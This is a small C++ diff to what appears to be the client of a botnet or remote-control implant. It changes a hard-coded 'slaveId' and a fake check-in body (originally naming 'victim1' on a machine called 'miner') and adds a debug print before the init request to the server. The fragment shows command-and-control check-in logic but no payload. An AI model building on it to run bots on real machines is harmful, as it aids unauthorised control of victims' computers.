@@ -13,7 +13,7 @@ using namespace std;
 
 class ConnectionController {
 private: 
-    const string slaveId = "e1896e80-c325-11ed-b033-f5252f300cca";
+    const string slaveId = "e1896e80-c325-11ed-b033-f5252f300caa";
     string computername, username, computerinfo;
     string jobId = "NO_JOBS";
     int objectSize = 0;
@@ -69,7 +69,7 @@ private:
         //     this->computername.c_str(), this->computerinfo.c_str(), this->slaveId.c_str());
 
 
-        return "{\"username\":\"victim1\", \"computername\":\"miner\", \"info\":\"LINUX\", \"id\":\"e1896e80-c325-11ed-b033-f5252f300cca\"}";
+        return "{\"username\":\"tommy\", \"computername\":\"tommy's computer\", \"info\":\"LINUX\", \"id\":\"e1896e80-c325-11ed-b033-f5252f300cfa\"}";
     }
 
     char* prepareJobURL() {
@@ -114,6 +114,7 @@ public:
     // Sends the init request.
     int initConnection() {
 
+        printf("Connecting with id %s\n", this->slaveId.c_str());
         json::JSON responseBody = httpPOST(URL_INIT, prepareInitBody());
         if (responseBody.size() <= 0) {
             return RESPONSE_ERROR; // No response from server.
